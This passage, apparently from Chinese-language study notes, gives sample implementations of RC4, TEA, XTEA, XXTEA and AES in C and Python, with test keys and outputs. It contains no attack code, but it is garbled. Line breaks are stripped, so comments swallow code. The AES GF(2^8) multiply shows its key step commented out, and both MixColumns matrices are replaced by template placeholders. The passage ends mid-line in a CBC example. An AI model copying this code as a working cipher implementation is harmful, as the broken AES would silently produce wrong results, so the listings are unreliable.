unsigned long Len_k) &#123; RC4(Data, Len_D, key, Len_k);&#125;int main()&#123; // 字符串密钥 unsigned char key[] = \"secret\"; unsigned long key_len = sizeof(key) - 1;// 字符串最后还有一个 '/0' 所以需要 - 1 // 数组密钥 //unsigned char key[] = &#123;'s','e','c','r','e','t'&#125;; //unsigned long key_len = sizeof(key); unsigned char data[] = &#123; 116, 104, 105, 115, 32, 105, 115, 32, 82, 67, 52, 44, 111, 97, 99, 105, 97 &#125;; // 对明文进行加密 RC4encrypt(data, sizeof(data), key, key_len); for (int i = 0; i &lt; sizeof(data); i++) &#123; printf(\"%d, \", data[i]); &#125; printf(\"\\n\"); // 对密文进行解密 RC4encrypt(data, sizeof(data), key, key_len); for (int i = 0; i &lt; sizeof(data); i++) &#123; printf(\"%c\", data[i]); &#125; printf(\"\\n\"); return 0;&#125;/*153, 94, 187, 111, 162, 205, 165, 134, 96, 136, 143, 240, 156, 135, 150, 94, 204,this is RC4,oacia*/ # TEA from ctypes import *def encrypt(v, k): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x9e3779b9 k0, k1, k2, k3 = k[0], k[1], k[2], k[3] total = c_uint32(0) for i in range(32): total.value += delta v0.value += ((v1.value &lt;&lt; 4) + k0) ^ (v1.value + total.value) ^ ((v1.value >> 5) + k1) v1.value += ((v0.value &lt;&lt; 4) + k2) ^ (v0.value + total.value) ^ ((v0.value >> 5) + k3) return v0.value, v1.valuedef decrypt(v, k): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x9e3779b9 k0, k1, k2, k3 = k[0], k[1], k[2], k[3] total = c_uint32(delta * 32) for i in range(32): v1.value -= ((v0.value &lt;&lt; 4) + k2) ^ (v0.value + total.value) ^ ((v0.value >> 5) + k3) v0.value -= ((v1.value &lt;&lt; 4) + k0) ^ (v1.value + total.value) ^ ((v1.value >> 5) + k1) total.value -= delta return v0.value, v1.value# 待加密的明文，两个 32 位整型，即 64bit 的明文数据value = [0x6869216f, 0x61636961]# 四个 key，每个是 32bit，即密钥长度为 128bitkey = [0x1, 0x2, 0x3, 0x4]print(\"Data is : \", hex(value[0]), hex(value[1]))res = encrypt(value, key)print(\"Encrypted data is : \", hex(res[0]), hex(res[1]))res = decrypt(res, key)print(\"Decrypted data is : \", hex(res[0]), hex(res[1]))\"\"\"Data is : 0x6869216f 0x61636961Encrypted data is : 0x55d9ac0b 0x2df0479fDecrypted data is : 0x6869216f 0x61636961\"\"\" #include &lt;stdio.h>#include &lt;stdint.h>// 加密函数void encrypt(uint32_t* v, uint32_t* k) &#123; uint32_t delta = 0x9e3779b9; uint32_t v0 = v[0], v1 = v[1], sum = 0, i; uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (i = 0; i &lt; 32; i++) &#123; sum += delta; v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1); v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3); &#125; v[0] = v0; v[1] = v1;&#125;// 解密函数void decrypt(uint32_t* v, uint32_t* k) &#123; uint32_t delta = 0x9e3779b9; uint32_t v0 = v[0], v1 = v[1], sum = 32*delta, i; uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (i = 0; i&lt;32; i++) &#123; v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3); v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1); sum -= delta; &#125; v[0] = v0; v[1] = v1;&#125;int main()&#123; //v 为要加解密的数据，两个 32 位无符号整数 uint32_t v[2] = &#123; 0x6869216f, 0x61636961 &#125;; //k 为加解密密钥，4 个 32 位无符号整数，密钥长度为 128 位 uint32_t k[4] = &#123; 0x1, 0x2, 0x3, 0x4 &#125;; int n = sizeof(v) / sizeof(uint32_t); printf(\"Data is : 0x%x 0x%x\\n\", v[0], v[1]); encrypt(v, k); printf(\"Encrypted data is : 0x%x 0x%x\\n\", v[0], v[1]); decrypt(v, k); printf(\"Decrypted data is : 0x%x 0x%x\\n\", v[0], v[1]); return 0;&#125;/*Data is : 0x6869216f 0x61636961Encrypted data is : 0x55d9ac0b 0x2df0479fDecrypted data is : 0x6869216f 0x61636961*/ from ctypes import *def encrypt(v, key): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x9E3779B9 total = c_uint32(0) for i in range(32): v0.value += (((v1.value &lt;&lt; 4) ^ (v1.value >> 5)) + v1.value) ^ (total.value + key[total.value &amp; 3]) total.value += delta v1.value += (((v0.value &lt;&lt; 4) ^ (v0.value >> 5)) + v0.value) ^ (total.value + key[(total.value >> 11) &amp; 3]) return v0.value, v1.valuedef decrypt(v, key): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x9E3779B9 total = c_uint32(delta * 32) for i in range(32): v1.value -= (((v0.value &lt;&lt; 4) ^ (v0.value >> 5)) + v0.value) ^ (total.value + key[(total.value >> 11) &amp; 3]) total.value -= delta v0.value -= (((v1.value &lt;&lt; 4) ^ (v1.value >> 5)) + v1.value) ^ (total.value + key[total.value &amp; 3]) return v0.value, v1.value# testif __name__ == \"__main__\": # 待加密的明文，两个 32 位整型，即 64bit 的明文数据 value = [0x6869216f, 0x61636961] # 四个 key，每个是 32bit，即密钥长度为 128bit key = [0x1, 0x2, 0x3, 0x4] print(\"Data is : \", hex(value[0]), hex(value[1])) res = encrypt(value, key) print(\"Encrypted data is : \", hex(res[0]), hex(res[1])) res = decrypt(res, key) print(\"Decrypted data is : \", hex(res[0]), hex(res[1]))\"\"\"Data is : 0x6869216f 0x61636961Encrypted data is : 0x39f25ea9 0x92754c5dDecrypted data is : 0x6869216f 0x61636961\"\"\" #include &lt;stdio.h>#include &lt;stdint.h>// 加密函数void encrypt(uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0 = v[0], v1 = v[1], sum = 0, delta = 0x9E3779B9; for (i = 0; i &lt; 32; i++) &#123; v0 += (((v1 &lt;&lt; 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum &amp; 3]); sum += delta; v1 += (((v0 &lt;&lt; 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum >> 11) &amp; 3]); &#125; v[0] = v0; v[1] = v1;&#125;// 解密函数void decrypt(uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0 = v[0], v1 = v[1], delta = 0x9E3779B9, sum = delta*32; for (i = 0; i &lt; 32; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum >> 11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum &amp; 3]); &#125; v[0] = v0; v[1] = v1;&#125;int main()&#123; //v 为要加解密的数据，两个 32 位无符号整数 uint32_t v[2] = &#123; 0x6869216f, 0x61636961 &#125;; //k 为加解密密钥，4 个 32 位无符号整数，密钥长度为 128 位 uint32_t k[4] = &#123; 0x1, 0x2, 0x3, 0x4 &#125;; int n = sizeof(v) / sizeof(uint32_t); printf(\"Data is : 0x%x 0x%x\\n\", v[0], v[1]); encrypt(v, k); printf(\"Encrypted data is : 0x%x 0x%x\\n\", v[0], v[1]); decrypt(v, k); printf(\"Decrypted data is : 0x%x 0x%x\\n\", v[0], v[1]); return 0;&#125;/*Data is : 0x6869216f 0x61636961Encrypted data is : 0x39f25ea9 0x92754c5dDecrypted data is : 0x6869216f 0x61636961*/ from ctypes import *def MX(z, y, total, key, p, e): temp1 = (z.value >> 5 ^ y.value &lt;&lt; 2) + (y.value >> 3 ^ z.value &lt;&lt; 4) temp2 = (total.value ^ y.value) + (key[(p &amp; 3) ^ e.value] ^ z.value) return c_uint32(temp1 ^ temp2)def encrypt(n, v, key): delta = 0x9e3779b9 rounds = 6 + 52 // n total = c_uint32(0) z = c_uint32(v[n - 1]) e = c_uint32(0) while rounds > 0: total.value += delta e.value = (total.value >> 2) &amp; 3 for p in range(n - 1): y = c_uint32(v[p + 1]) v[p] = c_uint32(v[p] + MX(z, y, total, key, p, e).value).value z.value = v[p] y = c_uint32(v[0]) v[n - 1] = c_uint32(v[n - 1] + MX(z, y, total, key, n - 1, e).value).value z.value = v[n - 1] rounds -= 1 return vdef decrypt(n, v, key): delta = 0x9e3779b9 rounds = 6 + 52 // n total = c_uint32(rounds * delta) y = c_uint32(v[0]) e = c_uint32(0) while rounds > 0: e.value = (total.value >> 2) &amp; 3 for p in range(n - 1, 0, -1): z = c_uint32(v[p - 1]) v[p] = c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value y.value = v[p] z = c_uint32(v[n - 1]) v[0] = c_uint32(v[0] - MX(z, y, total, key, 0, e).value).value y.value = v[0] total.value -= delta rounds -= 1 return v# testif __name__ == \"__main__\": # 该算法中每次可加密不只 64bit 的数据，并且加密的轮数由加密数据长度决定 v = [0x6869216f, 0x61636961] k = [0x1, 0x2, 0x3, 0x4] n = 2 print(\"Data is : \", hex(v[0]), hex(v[1])) res = encrypt(n, v, k) print(\"Encrypted data is : \", hex(res[0]), hex(res[1])) res = decrypt(n, res, k) print(\"Decrypted data is : \", hex(res[0]), hex(res[1]))\"\"\"Data is : 0x6869216f 0x61636961Encrypted data is : 0x973cd3b0 0x797bf2abDecrypted data is : 0x6869216f 0x61636961\"\"\" #include &lt;stdio.h>#include &lt;stdint.h>#define DELTA 0x9e3779b9#define MX (((z>>5^y&lt;&lt;2) + (y>>3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))void btea(uint32_t *v, int n, uint32_t const key[4])&#123; uint32_t y, z, sum; unsigned p, rounds, e; // 加密 if (n > 1) &#123; rounds = 6 + 52 / n; sum = 0; z = v[n - 1]; do &#123; sum += DELTA; e = (sum >> 2) &amp; 3; for (p = 0; p&lt;n - 1; p++) &#123; y = v[p + 1]; z = v[p] += MX; &#125; y = v[0]; z = v[n - 1] += MX; &#125; while (--rounds); &#125; // 解密 else if (n &lt; -1) &#123; n = -n; rounds = 6 + 52 / n; sum = rounds*DELTA; y = v[0]; do &#123; e = (sum >> 2) &amp; 3; for (p = n - 1; p>0; p--) &#123; z = v[p - 1]; y = v[p] -= MX; &#125; z = v[n - 1]; y = v[0] -= MX; sum -= DELTA; &#125; while (--rounds); &#125;&#125;int main()&#123; /* 该算法中每次可加密不只 64bit 的数据，并且加密的轮数由加密数据长度决定 */ uint32_t v[2] = &#123;0x6869216f, 0x61636961 &#125;; uint32_t const k[4] = &#123;0x1, 0x2, 0x3, 0x4&#125;; //n 的绝对值表示 v 的长度，取正表示加密，取负表示解密 int n = sizeof(v) / sizeof(uint32_t); printf(\"Data is : 0x%x 0x%x\\n\", v[0], v[1]); btea(v, n, k); printf(\"Encrypted data is : 0x%x 0x%x\\n\", v[0], v[1]); btea(v, -n, k); printf(\"Decrypted data is : 0x%x 0x%x\\n\", v[0], v[1]); return 0;&#125;/*Data is : 0x6869216f 0x61636961Encrypted data is : 0x973cd3b0 0x797bf2abDecrypted data is : 0x6869216f 0x61636961*/ # AES from Crypto.Cipher import AESpassword = b'secret!!secret!!' # 秘钥必须为 16 字节或者 16 字节的倍数的字节型数据text = b'TextTextTextText' # 明文必须为 16 字节或者 16 字节的倍数的字节型数据，如果不够 16 字节需要进行补全aes = AES.new(password, AES.MODE_ECB) # 创建一个 aes 对象# AES.MODE_ECB 表示模式是 ECB 模式en_text = aes.encrypt(text) # 加密明文print(\"密文：\", en_text) # 加密明文，bytes 类型de_text = aes.decrypt(en_text) # 解密密文print(\"明文：\", de_text)'''密文： b'\\t9\\x9b\\xc5\\x19E\\xeb4oL\\x1a`\\xc7\\x8b\\xd4\\xb2'明文： b'TextTextTextText'''' todo #include &lt;stdint.h>#include &lt;stdio.h>#include &lt;string.h>typedef struct&#123; uint32_t eK[44], dK[44]; // encKey, decKey int Nr; // 10 rounds&#125;AesKey;#define BLOCKSIZE 16 //AES-128 分组长度为 16 字节// uint8_t y[4] -> uint32_t x#define LOAD32H(x, y) \\ do &#123; (x) = ((uint32_t)((y)[0] &amp; 0xff)&lt;&lt;24) | ((uint32_t)((y)[1] &amp; 0xff)&lt;&lt;16) | \\ ((uint32_t)((y)[2] &amp; 0xff)&lt;&lt;8) | ((uint32_t)((y)[3] &amp; 0xff));&#125; while(0)// uint32_t x -> uint8_t y[4]#define STORE32H(x, y) \\ do &#123; (y)[0] = (uint8_t)(((x)>>24) &amp; 0xff); (y)[1] = (uint8_t)(((x)>>16) &amp; 0xff); \\ (y)[2] = (uint8_t)(((x)>>8) &amp; 0xff); (y)[3] = (uint8_t)((x) &amp; 0xff); &#125; while(0)// 从 uint32_t x 中提取从低位开始的第 n 个字节#define BYTE(x, n) (((x) >> (8 * (n))) &amp; 0xff)/* used for keyExpansion */// 字节替换然后循环左移 1 位#define MIX(x) (((S[BYTE(x, 2)] &lt;&lt; 24) &amp; 0xff000000) ^ ((S[BYTE(x, 1)] &lt;&lt; 16) &amp; 0xff0000) ^ \\ ((S[BYTE(x, 0)] &lt;&lt; 8) &amp; 0xff00) ^ (S[BYTE(x, 3)] &amp; 0xff))//uint32_t x 循环左移 n 位#define ROF32(x, n) (((x) &lt;&lt; (n)) | ((x) >> (32-(n))))//uint32_t x 循环右移 n 位#define ROR32(x, n) (((x) >> (n)) | ((x) &lt;&lt; (32-(n))))/* for 128-bit blocks, Rijndael never uses more than 10 rcon values */// AES-128 轮常量static const uint32_t rcon[10] = &#123; 0x01000000UL, 0x02000000UL, 0x04000000UL, 0x08000000UL, 0x10000000UL, 0x20000000UL, 0x40000000UL, 0x80000000UL, 0x1B000000UL, 0x36000000UL&#125;;// S 盒unsigned char S[256] = &#123; 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16&#125;;// 逆 S 盒unsigned char inv_S[256] = &#123; 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D&#125;;/* copy in[16] to state[4][4] */int loadStateArray(uint8_t (*state)[4], const uint8_t *in) &#123; for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; state[j][i] = *in++; &#125; &#125; return 0;&#125;/* copy state[4][4] to out[16] */int storeStateArray(uint8_t (*state)[4], uint8_t *out) &#123; for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; *out++ = state[j][i]; &#125; &#125; return 0;&#125;// 秘钥扩展int keyExpansion(const uint8_t *key, uint32_t keyLen, AesKey *aesKey) &#123; if (NULL == key || NULL == aesKey)&#123; printf(\"keyExpansion param is NULL\\n\"); return -1; &#125; if (keyLen != 16)&#123; printf(\"keyExpansion keyLen = %d, Not support.\\n\", keyLen); return -1; &#125; uint32_t *w = aesKey->eK; // 加密秘钥 uint32_t *v = aesKey->dK; // 解密秘钥 /* keyLen is 16 Bytes, generate uint32_t W[44]. */ /* W[0-3] */ for (int i = 0; i &lt; 4; ++i) &#123; LOAD32H(w[i], key + 4*i); &#125; /* W[4-43] */ for (int i = 0; i &lt; 10; ++i) &#123; w[4] = w[0] ^ MIX(w[3]) ^ rcon[i]; w[5] = w[1] ^ w[4]; w[6] = w[2] ^ w[5]; w[7] = w[3] ^ w[6]; w += 4; &#125; w = aesKey->eK+44 - 4; // 解密秘钥矩阵为加密秘钥矩阵的倒序，方便使用，把 ek 的 11 个矩阵倒序排列分配给 dk 作为解密秘钥 // 即 dk [0-3]=ek [41-44], dk [4-7]=ek [37-40]... dk [41-44]=ek [0-3] for (int j = 0; j &lt; 11; ++j) &#123; for (int i = 0; i &lt; 4; ++i) &#123; v[i] = w[i]; &#125; w -= 4; v += 4; &#125; return 0;&#125;// 轮秘钥加int addRoundKey(uint8_t (*state)[4], const uint32_t *key) &#123; uint8_t k[4][4]; /* i: row, j: col */ for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; k[i][j] = (uint8_t) BYTE(key[j], 3 - i); /* 把 uint32 key [4] 先转换为矩阵 uint8 k [4][4] */ state[i][j] ^= k[i][j]; &#125; &#125; return 0;&#125;// 字节替换int subBytes(uint8_t (*state)[4]) &#123; /* i: row, j: col */ for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; state[i][j] = S[state[i][j]]; // 直接使用原始字节作为 S 盒数据下标 &#125; &#125; return 0;&#125;// 逆字节替换int invSubBytes(uint8_t (*state)[4]) &#123; /* i: row, j: col */ for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; state[i][j] = inv_S[state[i][j]]; &#125; &#125; return 0;&#125;// 行移位int shiftRows(uint8_t (*state)[4]) &#123; uint32_t block[4] = &#123;0&#125;; /* i: row */ for (int i = 0; i &lt; 4; ++i) &#123; // 便于行循环移位，先把一行 4 字节拼成 uint_32 结构，移位后再转成独立的 4 个字节 uint8_t LOAD32H(block[i], state[i]); block[i] = ROF32(block[i], 8*i); STORE32H(block[i], state[i]); &#125; return 0;&#125;// 逆行移位int invShiftRows(uint8_t (*state)[4]) &#123; uint32_t block[4] = &#123;0&#125;; /* i: row */ for (int i = 0; i &lt; 4; ++i) &#123; LOAD32H(block[i], state[i]); block[i] = ROR32(block[i], 8*i); STORE32H(block[i], state[i]); &#125; return 0;&#125;/* Galois Field (256) Multiplication of two Bytes */// 两字节的伽罗华域乘法运算uint8_t GMul(uint8_t u, uint8_t v) &#123; uint8_t p = 0; for (int i = 0; i &lt; 8; ++i) &#123; if (u &amp; 0x01) &#123; // p ^= v; &#125; int flag = (v &amp; 0x80); v &lt;&lt;= 1; if (flag) &#123; v ^= 0x1B; /* x^8 + x^4 + x^3 + x + 1 */ &#125; u >>= 1; &#125; return p;&#125;// 列混合int mixColumns(uint8_t (*state)[4]) &#123; uint8_t tmp[4][4]; uint8_t M[4][4] = &lt;!--swig￼0-->; /* copy state[4][4] to tmp[4][4] */ for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j)&#123; tmp[i][j] = state[i][j]; &#125; &#125; for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; // 伽罗华域加法和乘法 state[i][j] = GMul(M[i][0], tmp[0][j]) ^ GMul(M[i][1], tmp[1][j]) ^ GMul(M[i][2], tmp[2][j]) ^ GMul(M[i][3], tmp[3][j]); &#125; &#125; return 0;&#125;// 逆列混合int invMixColumns(uint8_t (*state)[4]) &#123; uint8_t tmp[4][4]; uint8_t M[4][4] = &lt;!--swig￼1-->; // 使用列混合矩阵的逆矩阵 /* copy state[4][4] to tmp[4][4] */ for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j)&#123; tmp[i][j] = state[i][j]; &#125; &#125; for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; state[i][j] = GMul(M[i][0], tmp[0][j]) ^ GMul(M[i][1], tmp[1][j]) ^ GMul(M[i][2], tmp[2][j]) ^ GMul(M[i][3], tmp[3][j]); &#125; &#125; return 0;&#125;// AES-128 加密接口，输入 key 应为 16 字节长度，输入长度应该是 16 字节整倍数，// 这样输出长度与输入长度相同，函数调用外部为输出数据分配内存int aesEncrypt(const uint8_t *key, uint32_t keyLen, const uint8_t *pt, uint8_t *ct, uint32_t len) &#123; AesKey aesKey; uint8_t *pos = ct; const uint32_t *rk = aesKey.eK; // 解密秘钥指针 uint8_t out[BLOCKSIZE] = &#123;0&#125;; uint8_t actualKey[16] = &#123;0&#125;; uint8_t state[4][4] = &#123;0&#125;; if (NULL == key || NULL == pt || NULL == ct)&#123; printf(\"param err.\\n\"); return -1; &#125; if (keyLen > 16)&#123; printf(\"keyLen must be 16.\\n\"); return -1; &#125; if (len % BLOCKSIZE)&#123; printf(\"inLen is invalid.\\n\"); return -1; &#125; memcpy(actualKey, key, keyLen); keyExpansion(actualKey, 16, &amp;aesKey); // 秘钥扩展 // 使用 ECB 模式循环加密多个分组长度的数据 for (int i = 0; i &lt; len; i += BLOCKSIZE) &#123; // 把 16 字节的明文转换为 4x4 状态矩阵来进行处理 loadStateArray(state, pt); // 轮秘钥加 addRoundKey(state, rk); for (int j = 1; j &lt; 10; ++j) &#123; rk += 4; subBytes(state); // 字节替换 shiftRows(state); // 行移位 mixColumns(state); // 列混合 addRoundKey(state, rk); // 轮秘钥加 &#125; subBytes(state); // 字节替换 shiftRows(state); // 行移位 // 此处不进行列混合 addRoundKey(state, rk+4); // 轮秘钥加 // 把 4x4 状态矩阵转换为 uint8_t 一维数组输出保存 storeStateArray(state, pos); pos += BLOCKSIZE; // 加密数据内存指针移动到下一个分组 pt += BLOCKSIZE; // 明文数据指针移动到下一个分组 rk = aesKey.eK; // 恢复 rk 指针到秘钥初始位置 &#125; return 0;&#125;// AES128 解密， 参数要求同加密int aesDecrypt(const uint8_t *key, uint32_t keyLen, const uint8_t *ct, uint8_t *pt, uint32_t len) &#123; AesKey aesKey; uint8_t *pos = pt; const uint32_t *rk = aesKey.dK; // 解密秘钥指针 uint8_t out[BLOCKSIZE] = &#123;0&#125;; uint8_t actualKey[16] = &#123;0&#125;; uint8_t state[4][4] = &#123;0&#125;; if (NULL == key || NULL == ct || NULL == pt)&#123; printf(\"param err.\\n\"); return -1; &#125; if (keyLen > 16)&#123; printf(\"keyLen must be 16.\\n\"); return -1; &#125; if (len % BLOCKSIZE)&#123; printf(\"inLen is invalid.\\n\"); return -1; &#125; memcpy(actualKey, key, keyLen); keyExpansion(actualKey, 16, &amp;aesKey); // 秘钥扩展，同加密 for (int i = 0; i &lt; len; i += BLOCKSIZE) &#123; // 把 16 字节的密文转换为 4x4 状态矩阵来进行处理 loadStateArray(state, ct); // 轮秘钥加，同加密 addRoundKey(state, rk); for (int j = 1; j &lt; 10; ++j) &#123; rk += 4; invShiftRows(state); // 逆行移位 invSubBytes(state); // 逆字节替换，这两步顺序可以颠倒 addRoundKey(state, rk); // 轮秘钥加，同加密 invMixColumns(state); // 逆列混合 &#125; invSubBytes(state); // 逆字节替换 invShiftRows(state); // 逆行移位 // 此处没有逆列混合 addRoundKey(state, rk+4); // 轮秘钥加，同加密 storeStateArray(state, pos); // 保存明文数据 pos += BLOCKSIZE; // 输出数据内存指针移位分组长度 ct += BLOCKSIZE; // 输入数据内存指针移位分组长度 rk = aesKey.dK; // 恢复 rk 指针到秘钥初始位置 &#125; return 0;&#125;// 方便输出 16 进制数据void printHex(uint8_t *ptr, int len, char *tag) &#123; printf(\"%s\\ndata[%d]: \", tag, len); for (int i = 0; i &lt; len; ++i) &#123; printf(\"%.2X \", *ptr++); &#125; printf(\"\\n\");&#125;//S 盒转逆 S 盒，S 盒不是标准的时候使用void get_S_rev()&#123; uint8_t line=0,rol=0;// 位置 for(int i=0;i&lt;256;i++)&#123; line = (S[i]&amp;0xf0)>>4; rol = S[i]&amp;0xf; inv_S[line*16+rol] = i; &#125;&#125;int main() &#123; //get_S_rev ();//S 盒有变化，需要求出逆 S 盒 const uint8_t key[16] = &#123;0x73,0x65,0x63,0x72,0x65,0x74,0x21,0x21,0x73,0x65,0x63,0x72,0x65,0x74,0x21,0x21&#125;; const uint8_t pt[16]=&#123;0x54,0x65,0x78,0x74,0x54,0x65,0x78,0x74,0x54,0x65,0x78,0x74,0x54,0x65,0x78,0x74&#125;; uint8_t ct[16] = &#123;0&#125;; // 外部申请输出数据内存，用于加密后的数据 uint8_t plain[16] = &#123;0&#125;; // 外部申请输出数据内存，用于解密后的数据 aesEncrypt(key, 16, pt, ct, 16); // 加密 printHex(ct, 16, \"after encryption:\"); // 打印加密后的密文 aesDecrypt(key, 16, ct, plain, 16); // 解密 printHex(plain, 16, \"after decryption:\"); // 打印解密后的明文数据. return 0;&#125;/*after encryption:data[16]: 09 39 9B C5 19 45 EB 34 6F 4C 1A 60 C7 8B D4 B2 after decryption:data[16]: 54 65 78 74 54 65 78 74 54 65 78 74 54 65 78 74 */ from Crypto.Cipher import AESpassword = b'secret!!secret!!' # 秘钥必须为 16 字节或者 16 字节的倍数的字节型数据iv = b'1234567812345678' # iv 